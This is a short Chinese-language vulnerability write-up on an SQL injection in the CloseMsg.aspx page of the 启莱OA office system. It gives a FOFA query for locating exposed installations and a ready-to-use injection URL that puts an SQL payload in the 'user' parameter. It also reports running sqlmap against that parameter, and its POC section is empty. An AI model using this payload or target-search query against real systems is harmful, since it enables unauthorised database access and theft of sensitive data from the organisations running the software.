# 启莱OA-CloseMsg.aspx-SQL注入漏洞

## 漏洞描述

启莱OA CloseMsg.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

> [!NOTE]
>
> 启莱OA

## FOFA

> [!NOTE]
>
> app="启莱OA"

## 漏洞复现

登录页面如下

![](D:\知识星球\image\ql-1-1621166871878.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

存在SQL注入的文件为 CloseMsg.aspx 

```
http://xxx.xxx.xxx.xxx/client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1
```



![](启莱OA-CloseMsg.aspx-SQL注入漏洞.assets/16273635442157729.jpg)

使用SQLmap对参数 user 进行注入

![](启莱OA-CloseMsg.aspx-SQL注入漏洞.assets/1627363544498425.jpg)

## Goby & POC

